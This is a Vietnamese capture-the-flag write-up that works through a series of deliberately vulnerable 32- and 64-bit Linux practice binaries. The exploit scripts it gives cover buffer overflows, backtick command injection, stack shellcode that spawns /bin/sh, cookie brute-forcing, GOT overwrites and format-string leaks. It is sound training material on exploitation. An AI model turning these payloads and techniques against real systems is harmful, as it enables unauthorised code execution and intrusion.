# thực hành khai thác lỗ hổng phần mềm

## Level00

![image](https://hackmd.io/_uploads/ry6Ju6ALp.png)
đây là file chạy  32 bit trên linux

mình dùng IDA 32 bit để reverse chương trình được:
![image](https://hackmd.io/_uploads/HJAUOaALT.png)

bài này gặp lỗi buffer over flow vì dùng hàm get() và nếu biến v5 bằng 6969 thì chúng ta có thực hiện hàm system() để có  thể lấy được flag
 và mình sẽ nhập vào đủ 10 của biến s rồi ghi đè lên biến v5 giá trị 0x1B39 (6969 ở hệ 10)
 
```python=
#!/usr/bin/python3.7

from pwn import *

context.binary = exe = ELF('./Level00')

p = process(exe.path)

payload = b'A'*10 
payload += p32(0x1B39)

p.sendlineafter(b'ban: ', payload)


p.interactive()
```
 
![image](https://hackmd.io/_uploads/HJ7HsT08T.png)

và mình nhận được flag là: 
**KMA{4a57bff247b8cadf842ff34481979145}**

## Level01

![image](https://hackmd.io/_uploads/HkwdhTCU6.png)
đây là file chạy  32 bit trên linux

mình dùng IDA 32 bit để reverse chương trình được:

![image](https://hackmd.io/_uploads/B1g7u6pCIa.png)
chương trình này cho phép ta nhập vào chuỗi s và nối nó vào sau chuỗi dest rồi thực hiện hàm hệ thống system() vậy chúng ta chỉ cần nhập vào chuỗi s dấu ngắt lệnh  echo và thực hiện lệnh mà chúng ta muốn 


![image](https://hackmd.io/_uploads/HkhUapALp.png)

và mình nhận được flag là: **KMA{887ab5516cd1ef6b61223ff23d84ca34}**

## Level02

![image](https://hackmd.io/_uploads/Sk45A6ALT.png)
đây là file chạy  32 bit trên linux

mình dùng IDA 32 bit để reverse chương trình được:
![image](https://hackmd.io/_uploads/BJh6A6CUa.png)

chúng ta có thể thấy bài này tương tự bài Level01 nhưng có phần kiểm tra các ký tự đặc biệt trong chuỗi s mà chúng ta nhập vào. Nếu mà trùng với 1 trong những ký tự này sẽ thoát chương trình trước khi chúng ta có thể thực hiện hàm system()
nhưng chúng ta có thể thấy chương trình không bắt lỗi khi có dấu backtick và mình đã thực thi được câu lệnh đọc flag thông qua dấu này

![image](https://hackmd.io/_uploads/SJ5oozyD6.png)

và mình nhận được flag là: **KMA{213979182bc06fef699425b09bbad7cc**

## Level03

![image](https://hackmd.io/_uploads/SyCoRGkwT.png)
đây là file chạy  32 bit trên linux

mình dùng IDA 32 bit để reverse chương trình được:

![image](https://hackmd.io/_uploads/rkl1JQJDp.png)
![image](https://hackmd.io/_uploads/S1fcsmJwa.png)

bài này vẫn dùng hàm gets() cho chúng ta ghi đè lên các giá trị khác và lớp bảo vệ Canary cùng NX được tắt cho phép ta ghi lên các giá trị từ save EBP trở lên dễ dàng và cho phép stack thực thi lệnh   

![image](https://hackmd.io/_uploads/SkDi9PcPT.png)


![image](https://hackmd.io/_uploads/Hk5HGX1P6.png)

vậy chúng ta có thể tạo và thực thi shellcode trên stack. Để làm điều này chúng ta sẽ ghi đè lên giá trị trả về là đoạn shellcode mà chúng ta tạo. Để ghi đè lên trước hết chúng ta cần  biết địa chỉ kết thúc hàm main và cần nhập vào biến s bao nhiêu byte để đến được địa chỉ này ghi đè. Mình sẽ đặt break point tại hàm ret và chạy chương trình (nhập chuỗi đầu vào là AAAA tương ứng với 0x41414141)
![image](https://hackmd.io/_uploads/S1qNVX1Dp.png)
![image](https://hackmd.io/_uploads/rkHxgEkvp.png)
    

Return Adresss là ô nhớ tại đỉnh stack khi chuẩn bị thực hiện câu lệnh RET ở địa chỉ con trỏ lệnh  là 0xffffcbfc. Chuỗi nhập vào là “AAAA” tương ứng với chuỗi hex “41414141” nằm ở 0xffffcbec
Làm sao biết được địa chỉ của Shellcode để điều khiển Return Address trỏ vào Shellcode? 

![image](https://hackmd.io/_uploads/H1TTcQJvp.png)

![image](https://hackmd.io/_uploads/BylmEPqDp.png)


vậy chúng ta cần ghi đè giá trị ở đây là  0xf7dfbfa1 bằng địa chỉ của câu lệnh shellcode của chúng ta
=> chúng ta phải nhập 16 byte mới tới vị trí của hàm return và ghi đè 4 byte này 
mình lên https://defuse.ca/online-x86-assembler.htm#disassembly2 để viết shellcode được:
![image](https://hackmd.io/_uploads/ByNExbsDa.png)

![image](https://hackmd.io/_uploads/S1ioWWoD6.png)


![image](https://hackmd.io/_uploads/By2Jg-jPT.png)


```python=
#!/usr/bin/python3.7

from pwn import *

context.binary = exe = ELF('./Level03')

p = process(exe.path)

shellcode =b'\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80'
p.recvuntil(b'Cai nay ')
data = p.recv(8)
data = data.decode('utf8').strip()
data = "0x" + data
data = int(data, 16)
data += (16 + 4)
payload = b'A' *16
payload += p32(data) 
payload += shellcode
p.sendlineafter(b'khong?\n', payload)
p.sendline(b'cat flag')

p.interactive()
```
![image](https://hackmd.io/_uploads/ryU6tSqvp.png)
![image](https://hackmd.io/_uploads/SkZRFB9w6.png)

và mình lấy được flag là:
**KMA{b75d916e7d731cd88007584910214e1e}'**

## Level04

![image](https://hackmd.io/_uploads/SykXMpJvT.png)
đây là file chạy  32 bit trên linux

mình dùng IDA 32 bit để reverse chương trình được:
![image](https://hackmd.io/_uploads/HkQf761va.png)
![image](https://hackmd.io/_uploads/HymlTT1v6.png)

![image](https://hackmd.io/_uploads/HkT2pTyPT.png)
bài này có lỗi về chuỗi định dạng
![image](https://hackmd.io/_uploads/HyrRRpJD6.png)
![image](https://hackmd.io/_uploads/SJ5EJAkD6.png)
chúng ta có thể thấy đến chuỗi định dạng thứ 5 thì chúng ta đến được vị trí của chuỗi **%p** mà chúng ta nhập vào

![image](https://hackmd.io/_uploads/B1JKeCJw6.png)
![image](https://hackmd.io/_uploads/rySslRJDT.png)

chuối %p của chúng ta nhập vào ở 
vị trí esp+10Ch

4 ký tự đầu tiên chính là tham số thứ 5.
Để ô nhớ X mang giá trị 0x69696969 cần ô nhớ X mang giá trị 0x69, ô nhớ X+1 mang giá trị 0x69, ô nhớ X+2 mang giá trị 0x69, ô nhớ X+3 mang giá trị 69.
4 byte đầu là giá trị của X,  4 byte tiếp theo là giá trị X + 1, v.v…
Đã xuất ra màn hình 0x10 byte. Sử dụng "%89x" để xuất ra màn hình 0x59 byte nữa.
Cuối cùng là tham số %n để đặt giá trị. Ta sử dụng ký tự $ để xác định chính xác tham số thứ mấy tương ứng với % đó.

```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Level04')
p = process(exe.path)

p.recvuntil(b'check at ')
address = p.recvline()
address = address.decode('utf8').strip()
# address = address.replace('0x', '')
address=int(address, 16)

payload = p32(address)
payload += p32(address+1)
payload += p32(address+2)
payload += p32(address+3)
payload += f'%89x'.encode()
# payload = address
payload += f'%5$n'.encode()
payload += f'%6$n'.encode()
payload += f'%7$n'.encode()
payload += f'%8$n'.encode()
# p.sendline(str(payload).encode())
p.sendline((payload))
# p.sendline(str(data).encode())


p.interactive()
```

![image](https://hackmd.io/_uploads/ry1ULtKP6.png)
![image](https://hackmd.io/_uploads/HJRtUtKDp.png)

và mình lấy được flag là:
**KMA{8bbfeab07177f229c339d96aad29e985}**

## Level05
![image](https://hackmd.io/_uploads/B1EF6Rkv6.png)
đây là file chạy  64 bit trên linux

mình dùng IDA 64 bit để reverse chương trình được:

![image](https://hackmd.io/_uploads/ryRyC0kP6.png)

Không khác gì level04 ngoại trừ việc đây là một dịch vụ 64 bit. Đối với dịch vụ 64 bit. Địa chỉ ô nhớ sẽ mang vài byte null. Điều này khiến cho nếu sử dụng mã khai thác như cách giải bài level04 sẽ làm cho việc xuất string ra bị đứt đoạn (do gặp kí tự null) điều này dẫn đến không thể kiểm soát được số ký tự in ra màn hình.
Khắc phục bằng khách thay vì địa chỉ đặt ở đầu chuỗi ta có thể đặt ở cuối chuỗi. Như vậy số ký tự in ra màn hình không bị ảnh hưởng vì các byte null ở cuối chuỗi.

![image](https://hackmd.io/_uploads/rJURKYFva.png)

dùng gdb và mình dừng ngay sau hàm snprintf được

![image](https://hackmd.io/_uploads/BJECptYD6.png)


thấy rằng chuỗi mình nhập vào cách rsi 4(```%6$x```) nên để lấy được giá trị chúng ta nhập vào thì phải bắt đầu từ ```%10$x```
```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Level05')
p = process(exe.path)

p.recvuntil(b'check at ')
address = p.recvline()
address = address.decode('utf8').strip()
# address = address.replace('0x', '')
address=int(address, 16)

payload = f'%000105x%10$ln'.encode()
payload += f'%11$ln'.encode()
payload += f'%12$ln'.encode()
payload += f'%13$ln'.encode()

payload += p64(address)
payload += p64(address+1)
payload += p64(address+2)
payload += p64(address+3)
payload += f'%89x'.encode()
# payload = address

# p.sendline(str(payload).encode())
p.sendline((payload))
# p.sendline(str(data).encode())


p.interactive()
```



![image](https://hackmd.io/_uploads/B1scottv6.png)
![image](https://hackmd.io/_uploads/HJuiitKvp.png)
![image](https://hackmd.io/_uploads/B1VmstYwa.png)

và mình được flag là:
**KMA{56a9f418e78d3bda4ce47384bbf62055}**

## Level06
mình dùng IDA đọc source code được:

![image](https://hackmd.io/_uploads/rJuFZI9vp.png)


Tương tự level03 nhưng chương trình đã không cho thông tin về stack mà kẻ tấn công sẻ phải tự lấy thông tin để tính toán được chuỗi nhập vô ở đâu và sau đó chèn shellcode rồi thực thi.

![image](https://hackmd.io/_uploads/ryLspvqPp.png)

mình thấy vị trí %5$x cách vị trí mà chúng ta nhập vào  nhập vào 184 vậy là mình đã có vị trí stack cần thiết và sau đó mình làm như bài Level03

![image](https://hackmd.io/_uploads/ryI3TDqPa.png)

```python=
#!/usr/bin/python3.7

from pwn import *

context.binary = exe = ELF('./Level06')

p = process(exe.path)

# input()
shellcode =b'\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80'
payload1 = b'%5$x'
# payload = b'BBBB'
p.sendline(payload1)
data = p.recv(8) 
data = data.decode('utf8').strip()
data1 = data
data = "0x" + data
data = int(data, 16)
data -= 184
data += (16 + 4)
payload = b'A' * 16
payload += p32(data) 
payload += shellcode
p.sendline(payload) 
p.sendline(b'cat flag')

p.interactive()
```
## Level07
![image](https://hackmd.io/_uploads/ryw0V2tPT.png)

![image](https://hackmd.io/_uploads/S1N-Aitva.png)

đây là file 32 bit
mình dùng IDA đọc source code được:
**các hàm được dùng:**
![image](https://hackmd.io/_uploads/HJEjG2Ywp.png)

**hàm main():**
![image](https://hackmd.io/_uploads/rJSiRiKwa.png)

**hàm InitFlag():**
![image](https://hackmd.io/_uploads/Sk9aRjFw6.png)

vì khi kiểm tra đến điều kiện cuối cùng để đọc flag trong hàm OnSignin() chúng ta cần biến byte_804BEFC bằng 0 và khi ``` !byte_804BEFC bằng 1``` để đọc flag nên chúng ta phải thay đổi giá trị mặc định của nó đang là 1 thành 0. Chúng ta thấy biến answer có thể làm điều đó khi ghi đè được lên giá trị của byte_804BEFC vì aswer chỉ cần nhập tối đa 4 byte là ```Yes\n``` hoặc ```No\n``` nhưng chúng ta lại được nhập 0x3D(61 ở hệ 10) ký tự và chúng ta để ý rằng biến byte_804BEFC ở kiểu int kiểu số nếu chúng ta nhập vào nó 1 chuỗi "AAAA" chương trình sẽ tìm thấy không có số nào trong chuỗi này và convert nó về số 0 vậy là chúng ta đã đạt được mục đích

**hàm clean_stdin():**
![image](https://hackmd.io/_uploads/r1Y-J2YDp.png)

**hàm info():**
![image](https://hackmd.io/_uploads/ryCmk2KwT.png)

**hàm OnSignup():**
![image](https://hackmd.io/_uploads/HkO513YPa.png)

**hàm OnSignin():**
![image](https://hackmd.io/_uploads/SJyakhFwp.png)

**GetApiKey():**
![image](https://hackmd.io/_uploads/HJb2Z2KvT.png)

**hàm trimwhitespace():**
![image](https://hackmd.io/_uploads/BkF0W3KD6.png)

Đăng ký username không cho phép tên username có chứa ký tự root. Nếu đăng ký thành công chương trình sẽ cho ta một password để đăng nhập username đó.
Đăng nhập, strcmp(username, “root”) == 0 thì sẽ cho quyền đọc file flag. Nếu không thì chỉ hiện thông báo đăng nhập bình thường.
không cho đăng ký username tên là root nhưng lại bắt phải đăng nhập là root để có thể đọc được flag.

Lỗi ở đây được xác định là do người lập trình sử dụng hàm strcmp không đúng cách. Thông tin về hàm strcmp như sau: Hàm này sẽ bắt đầu so sánh ký tự đầu tiên của 2 chuỗi, nếu như 2 ký tự đó là giống nhau thì so sánh ký tự tiếp theo, cho đến khi 2 ký tự ở 2 chuỗi khác nhau hoặc gặp ký tự NULL. Hàm sẽ trả ra bằng 0 khi cả 2 chuỗi giống nhau. Hàm sẽ trả ra khác 0 nếu 2 chuỗi không giống nhau. Phân tích về hàm strcmp phía trên. Sẽ có 2 trường hợp hàm strcmp trả ra giá trị là 0, một là 2 chuỗi truyền vào giống nhau, hai là một trong hai chuỗi chứa ký tự đầu tiên là ký tự null. Như vậy để có thể lấy được flag ta chỉ cần đăng ký một tên nào đó có ký tự đầu tiên là null. Sau đó đăng nhập bằng tên đó. Như vậy ta sẽ có quyền đọc file flag.

```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Level07')
p = process(exe.path)

p.sendlineafter(b'Code:',b'1')
p.sendlineafter(b'Enter username:',b'\x00root')
p.recvuntil(b'Transaction key: ')
data = p.recvline()

p.sendlineafter(b'Code:',b'2')
p.sendlineafter(b'Enter username:',b'\x00root')
p.sendlineafter(b'Enter transaction key:', data)
payload = b'Yes\x00' 
payload += b'A'*56
payload += b'\n'
p.sendlineafter(b'(Yes/No)\n', payload)
p.sendlineafter(b'Code:',b'3')

p.interactive()
```

![image](https://hackmd.io/_uploads/HkkwYnFwT.png)
![image](https://hackmd.io/_uploads/HkfoF2Fwp.png)

và mình nhận ra chương trình còn đơn giản hơn thế vì  khi đăng ký mình không nhập root mà nhập tên mình và sau khi đăng nhập chương trình chỉ kiểm tra API mà không kiểm tra tên người dùng nên lúc này mình sẽ nhập root và vẫn được flag

![image](https://hackmd.io/_uploads/SJ3fM6Yw6.png)

```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Level07')
p = process(exe.path)

p.sendlineafter(b'Code:',b'1')
p.sendlineafter(b'Enter username:',b'cuong')
p.recvuntil(b'Transaction key: ')
data = p.recvline()

p.sendlineafter(b'Code:',b'2')
p.sendlineafter(b'Enter username:',b'root')
p.sendlineafter(b'Enter transaction key:', data)
payload = b'Yes\x00' 
payload += b'A'*56
payload += b'\n'
p.sendlineafter(b'(Yes/No)\n', payload)
p.sendlineafter(b'Code:',b'3')

p.interactive()
```

và mình lấy được flag là:
**KMA{174a65f44085ab0d277ce69177f1fd7f}**
## Bufferoverflow-homemade-cookie-v1

mình đọc file C được:
![image](https://hackmd.io/_uploads/S1iGQklPT.png)

thấy chương trình chạy qua hàm vun mà hàm này cho phép chúng ta nhập qua hàm gets() tùy ý số byte có thể dẫn đến lỗi buffer overflow nhưng trong hàm lại có 1 lớp bảo vệ chính là biến i nằm ở phía trên buff ở trên stack. Nếu ta nhập tràn qua biến này mà khác với giá trị bạn đầu của i thì chương trình sẽ kết thúc

![image](https://hackmd.io/_uploads/SJtdQ1ewa.png)
vậy nên khi nhập trà đến biến i thì chúng phải ghi đúng giá trị của nó là 0xc00c1e rồi ghi tràn tiếp lên đến địa chỉ trả về rồi ghi đè vào đó là địa chỉ hàm **cat_flag** có chứa shellcode mà chúng ta mong muốn

![image](https://hackmd.io/_uploads/BkiTmkgwp.png)
mình nhập thử BBBB và thấy sẽ cần 16 byte để đến biến i ghi đúng giá trị của nó là 0xc00c1e rồi ghi thêm 12 byte nữa để đến địa chỉ trả về và ghi địa chỉ hàm cat_flag

![image](https://hackmd.io/_uploads/HyXLrkgv6.png)
vậy hãy giải quyết bài này thôi:
```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Bufferoverflow-homemade-cookie-v1')
p = process(exe.path)

input()
payload = b'A'* 16
payload += p32(0xc00c1e)
payload += b'A'*12
payload += p32(exe.sym['cat_flag'])
p.sendline(payload)

p.interactive()
```

![image](https://hackmd.io/_uploads/HkXMKkgw6.png)
mình debug động và kiểm tra stack thấy đã đúng với ý đồ mà chúng ta mong muốn và nó sẽ nhảy vào hàm cat_flag đọc flag cho chúng ta 

![image](https://hackmd.io/_uploads/B1QVKkeDT.png)

![image](https://hackmd.io/_uploads/SJC9Yklvp.png)

và mình nhận được flag là: 
**KMA{dont invent it with your small mind}**


## Bufferoverflow-homemade-cookie-v2

mình đọc file C được:
![image](https://hackmd.io/_uploads/r1iHWXgwT.png)

bài này tương tự bài trước nhưng giá trị của biến i bây giờ không còn cố định và biết trước như ở bài trên  
Biến cookie chỉ được khởi tạo ngẫu nhiên trong khoảng từ 0 -> 255 như vậy nếu ta tràn biến cookie với một giá trị bất kỳ thì xác xuất ta tràn đúng biến cookie ban đầu là 1/256 tỉ lệ này ở mức tỉ lệ “CAO” trong khai thác lỗ hổng nên ta hoàn toàn có thể sử dụng mã khai thác ở bài trước để khai thác tuy nhiên không phải lúc nào ta cũng có thể lấy được FLAG. Không có luật thi (sẽ không bao giờ có đối vs mảng EXPLOIT) ở CTF cấm người chơi sử dụng dịch vụ nhiều lần.

![image](https://hackmd.io/_uploads/S1ZaX7gwT.png)

```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Bufferoverflow-homemade-cookie-v2')
 
i = 0;
while(i>=0 and i<=256):
 p = process(exe.path)

# input()

 payload = b'A'* 16
 payload += p32(i)
 payload += b'A'*12
 payload += p32(exe.sym['cat_flag'])
 p.sendline(payload)
 data = p.recvline()
 if b'KMA' in data:
    break
 

p.interactive()
```

hoặc 
```python=
 while true; do python -c 'print "A"*0x10 + "\x30\x00\x00\x00" + "A"*0xc + "\x7b\x85\x04\x08"' | ./bufferoverflow-homemade-cookie-v2 | grep "KMA"; done
 ```
![image](https://hackmd.io/_uploads/r1juJVlDT.png)

và mình được flag là:
**KMA{dont invent it with your small mind v3rs10n 2}**

## Bufferoverflow-homemade-cookie-v3
mình đọc file C được:
![image](https://hackmd.io/_uploads/HkMTWVeva.png)

bài này tương tự bài trước nhưng giá trị của biến i bây giờ không còn cố định và biết trước như ở bài trên  

```python=
 while true; do python -c 'print "A"*0x10 + "\x30\x00\x00\x00" + "A"*0xc + "\x7b\x85\x04\x08"' | ./bufferoverflow-homemade-cookie-v3 | grep "KMA"; done
 ```

nhưng sẽ lâu hơn bài trước
![image](https://hackmd.io/_uploads/rJ_OMVxvT.png)
và mình được flag là:
**KMA{Oh no you do it again man ...}**

## Bufferoverflow-overwrite-command

mình đọc file C được:
![image](https://hackmd.io/_uploads/HyW08ExvT.png)

![image](https://hackmd.io/_uploads/S1Cq5ElP6.png)

vậy chúng ta phải ghi đè 16 byte vào biến buff để đến chuỗi **echo Bye!** và ghi đè lên nó **/bin/sh** để lấy shell thực thi

```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Bufferoverflow-overwrite-command')

p = process(exe.path)

# input()

payload = b'A'* 16
payload += b'/bin/sh'
p.sendline(payload)

p.interactive()
```



và mình đã lấy được shell và đọc file:
![image](https://hackmd.io/_uploads/ryrXBHlva.png)
hoặc các bạn có thể đọc flag luôn

```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Bufferoverflow-overwrite-command')

p = process(exe.path)

# input()

payload = b'A'* 16
payload += b'cat flag'
p.sendline(payload)

p.interactive()
```
![image](https://hackmd.io/_uploads/H1FrLHewT.png)


và mình được flag là:
**KMA{OVERWRITE TO INFINITIVE}**

## Bufferoverflow-overwrite-short-command

mình đọc source code được:
![image](https://hackmd.io/_uploads/HJC1_rlPT.png)

bài này chó mình nhập 20 byte vào biến buff trong khi chỉ khai báo 16 byte vậy chúng ta chỉ có thể ghi tràn 4 byte
Trong linux có một biến môi trường là PATH. Nếu biến PATH này chứa đường dẫn “/bin/” và trong “/bin/” có file thực thi tên “sh” thì dù đang ở bất cứ thư mục nào đều có thể thực thi file sh
và mình chỉ ghi **sh** và vẫn nhận được shell vì đường dẫn file này đã có trong biến môi trường

```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Bufferoverflow-overwrite-short-command')

p = process(exe.path)

# input()

payload = b'A'* 16
payload += b'sh'
p.sendline(payload)

p.interactive()
```


![image](https://hackmd.io/_uploads/HJDQeMDva.png)
nếu chỉ **p.send(payload)** mà không **p.sendline(payload)** thì sẽ không dùng được shell do chưa gắt lệnh:
![image](https://hackmd.io/_uploads/ByZ_ZGPP6.png)

![image](https://hackmd.io/_uploads/Byx0FBlwp.png)
và mình được flag là:
**KMA{CAN YOU DO THIS WITH ONLY 2 BYTE OVERWRITE?}**

## Bufferoverflow-1-byte
mình đọc source code được:
![image](https://hackmd.io/_uploads/Sy5VhreD6.png)

bài này cho chúng ta nhập vào biến buff 17 byte trong khi chỉ khai báo có 16 byte vậy chúng ta có thể ghi đè 1 byte này
Địa chỉ hàm byte được lưu vào biến callme_maybe sau đó đọc vào 17 byte tràn sang biến callme_maybe 1 byte. Sau đó sẽ gọi hàm có địa chỉ lưu trong biến  callme_maybe.
trong trường hợp này 1 byte là đủ vì hàm cat_flag và hàm Bye gần sát bên nhau nên có thể chúng chỉ khác nhau 1 byte. Hãy để ý đến trường hợp này vì sau này nếu ta cần brute-force địa chỉ hàm thì nếu chúng chỉ khác nhau 1 byte thì ta có thể may mắn thành công với tỉ lệ 1/256.

mình dùng gdb để kiểm tra thấy đúng là 2 hàm này ngay cạnh nhau 
![image](https://hackmd.io/_uploads/Sy0zRSgD6.png)
May mắn thay hàm Bye và cat_flag chỉ khác nhau byte cuối cùng chỉ cần tràn byte cuối cùng bằng giá trị 8b là chúng ta thay đổi luồng thực thi sang cat_flag

```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Bufferoverflow-1-byte')

p = process(exe.path)

# input()

payload = b'A'* 16
payload += b'\x8b'
p.sendline(payload)

p.interactive()
```


![image](https://hackmd.io/_uploads/rk8418lv6.png)

và mình được flag là:
**KMA{ONE BYTE IS ALL YOU NEED}**

## Formatstring-write-GOT
mình đọc source code được:
![image](https://hackmd.io/_uploads/rJAkVMDPp.png)
bài này bị lỗi format string do chúng ta nhập tùy ý giá trị vào biến buff và in ngay ra tại tham số đầu tien chuyền vào hàm print cho phép ta thực hiện chuỗi định dạng. Thay vì sử dụng format string “%s” thì ở đây lại xuất chính chuỗi buff ra
Ngay sau khi xuất chuỗi buff ra sẽ gọi hàm exit. Không thể điều khiển được con trỏ trả về như bài Bufferoverflow-homemade-cookie-v1 đến v3 vì chúng ta không thể leak được địa chỉ stack khi thực thi. Tuy nhiên chương trình lại gọi exit. Exit không có trong source và chương trình sẽ tạo liên kết động vậy ta chỉ cần chỉnh sửa liên kết này là có thể điều khiển luồng thực thi vào hàm cat_flag. Vì các hàm như print() hay exit() không có trong chương trình mà là của thư viện nên khi gọi đến lần đầu chúng sẽ được tìm trong thư viện chuẩn và lưu địa chỉ vào bảng GOT(Global Offset Table) để tiện cho quá trình gọi sau này 
![image](https://hackmd.io/_uploads/r14UjMwPT.png)
    
![image](https://hackmd.io/_uploads/Hy2I2MDDp.png)


![image](https://hackmd.io/_uploads/HJMwAGvvT.png)
Ta thấy ngay đầu hàm exit đã gọi jump đến giá trị nằm ở địa chỉ 0x804a018 chỉ cần thay đổi giá trị ô nhớ này thành địa chỉ của cat_flag là ta có thể lấy được flag
Giá trị ô 0x804a018 chỉ khác vs địa chỉ hàm cat_flag 2 byte sau như vậy ta chỉ cần dùng “%hn” ghi 1 lần là đủ.

![image](https://hackmd.io/_uploads/SyGG-svDa.png)

có thể thấy bắt đầu từ %x thứ tư ta có thể lấy được giá trị đã nhập vào

```python=
 python -c 'print "\x18\xa0\x04\x08" + "%33943x%4$hn"' | ./Formatstring-write-got-without-leak 
```

![image](https://hackmd.io/_uploads/SkLZJmPw6.png)

hoặc:
```python=
#!/usr/bin/python3.7

from pwn import *
context.binary = exe = ELF('./Formatstring-write-got-without-leak')

p = process(exe.path)

# input()

payload = b'\x18\xa0\x04\x08'
# payload += b'sh'
payload += f'%{33943}x%4$hn'.encode()
p.send(payload)

p.interactive()
```

![image](https://hackmd.io/_uploads/Hy5pr7vvT.png)


![image](https://hackmd.io/_uploads/HJYummPDT.png)

và mình được flag là:
**KMA{HOW CAN U BYPASS MY EXIT :(}**

## Formatstring-write-command
![image](https://hackmd.io/_uploads/rkIN6oPPp.png)

mình đọc source code được:
![image](https://hackmd.io/_uploads/rJeibovw6.png)

Chương trình sau khi nhận chuỗi buff vào sau đó xuất chuỗi buff ra (mắc lỗi format string). Sau đó sẽ thực thi câu lệnh ở biến toàn cục.

![image](https://hackmd.io/_uploads/H1OwdjDva.png)


chúng ta thấy biến toàn cục cmd ở địa chỉ **0x0804a040**

Ở đây ta chỉ cần ghi biến cmd thành “sh\x00” là ta sẽ có flag tương tự bài overwrite-short-command. Ở đây ta cần ghi 3 byte và byte sau bằng 0, sh\x00 encode sang hex sẽ là 736800 nhưng vì ghi 1 lần 4 byte và đây là hệ thống little-endian nên giá trị ta cần ghi là 0x00006873. Để dễ dàng tôi đặt địa chỉ cần ghi ở đầu chuỗi (điều này không khuyến khích vì nếu địa chỉ có NULL BYTE sẽ làm cho chuỗi bị đứt) sau đó ghi ra màn hình 
0x00006873-4 kí tự (4 ký tự là địa chỉ cần đi đè ta đã đặt trước đó) sau đó sử dụng %n.
![image](https://hackmd.io/_uploads/SJvBqswD6.png)

thấy tại chuỗi %x thứ 4 sẽ gặp lại chuỗi chúng ta nhập vào

![image](https://hackmd.io/_uploads/ByWS6pPwa.png)


![image](https://hackmd.io/_uploads/ByOs4pvwT.png)


```python=
#!/usr/bin/python3.7
from pwn import *
context.binary = exe = ELF('./Formatstring-write-command')

p = process(exe.path)

# input()

payload = b'\x40\xa0\x04\x08'
payload += f'%{0x00006873-4}x%4$n'.encode()
p.send(payload)

p.interactive()
```

và stack lúc này 
![image](https://hackmd.io/_uploads/SycjnTvDa.png)

hoặc:
```python=
#!/usr/bin/python3.7
from pwn import *
context.binary = exe = ELF('./Formatstring-write-command')

p = process(exe.path)

# input()

payload = b'\x40\xa0\x04\x08'
payload += f'%{0x003b6873-4}x%4$n'.encode()
p.send(payload)

p.interactive()
```

để ngắt  câu lệnh bằng dấu **";"**
![image](https://hackmd.io/_uploads/SJhBTnDDT.png)
sau đó mình đọc flag và được

và mình được flag là:
**KMA{OH ... YOU FOUND MY HIDDEN BACKDOOR}**

## Formatstring-leak-flag-in-mem-stack

![image](https://hackmd.io/_uploads/Ska9hRDwa.png)
file này 32 bít 
mình đọc source code được:
![image](https://hackmd.io/_uploads/HkkyT0PPT.png)

Flag sẽ được đọc lên bộ nhớ sau đó gọi hàm vun có mắc lỗi format string.

vậy là biến secret đã có trên stack và chúng ta chỉ cần tìm đến và đọc nó ra 


![image](https://hackmd.io/_uploads/HJPIZJOwa.png)

nhưng khi kết nối đến server từ xa chúng ta không thể làm như vậy và cần leak dữ liệu trên stack ra bằng %x hoặc %p

![image](https://hackmd.io/_uploads/S1_Zlldva.png)
khi chạy đến hàm gets() trong hàm vun() chúng ta thấy trên stack vẫn còn flag ở trên stack

![image](https://hackmd.io/_uploads/H1mdggdwa.png)




![image](https://hackmd.io/_uploads/r11BACvDa.png)

lên kt.gy dịch ra được 

![image](https://hackmd.io/_uploads/H1LR4k_Pp.png)

và mình được flag là: 
**KMA{AAAAAAAA_YOU_GOT_SOME_TALENT}**

## Formatstring-leak-flag-in-mem-stack-64bit
![image](https://hackmd.io/_uploads/S1yjrkOvp.png)

đây là file 64 bit
và mình đọc soucre code được:

![image](https://hackmd.io/_uploads/Hy2ar1dva.png)

bài này code như bài trước nhưng là file 64 bít và flag vẫn được đọc và đẩy lên stack 
![image](https://hackmd.io/_uploads/HymwU1_P6.png)

mình dừng tại hàm gets() trong  hàm vun() và được:

![image](https://hackmd.io/_uploads/HkloDkuvT.png)

![image](https://hackmd.io/_uploads/BkKnZguPT.png)

```%1$x```: thanh ghi rsi
```%2$x```: thanh ghi rdx
```%3$x```: thanh ghi r10
```%4$x```: thanh ghi r8
```%5$x```: thanh ghi r9
thấy rằng đỉnh stack esp sẽ lấy được tại ```%6$x ```nên để lấy được chuỗi flag sẽ bắt đầu từ ```%8$x```
vì là 64 bit nên giá trị trên stack sẽ lưu trữ là 8 byte nên chúng ta dùng %lx để đọc được hết 8 byte này


![image](https://hackmd.io/_uploads/rk-xo1dP6.png)


lên kt.gy giải 
![image](https://hackmd.io/_uploads/HJJ1jydPT.png)

và mình được flag là:
**KMA{AAAAAAAA_YOU_DID_IT_EVEN_IN_64_BIT}**

## Formatstring-leak-flag-in-mem-bss
![image](https://hackmd.io/_uploads/rJzH2yODa.png)

đây là file 32 bit
và mình đọc source code được:
![image](https://hackmd.io/_uploads/H1eOny_D6.png)

chương trình này khác với các bài trước là biến secret không phải biến local của main nên không được nạp vào stack mà nó là biến toàn cục

![image](https://hackmd.io/_uploads/BJ0UA1uv6.png)

khi đọc từ file flag ra ta có flag trên stack do truy xuất từ biến cục bộ **file** ra 
![image](https://hackmd.io/_uploads/BktxAk_w6.png)

nhưng chúng ta có thể thấy khi chạy đến hàm vun() thì stack không còn flag

![image](https://hackmd.io/_uploads/rJ58zeuv6.png)


![image](https://hackmd.io/_uploads/HJZuMgOwa.png)

vậy flag vẫn được lưu trong biến secret nhưng giờ giá trị này không được đẩy lên stack vậy chúng ta có thể tìm đến địa chỉ của biến secret và nhập %s để in ra giá trị của biến này

![image](https://hackmd.io/_uploads/r1lf4x_PT.png)
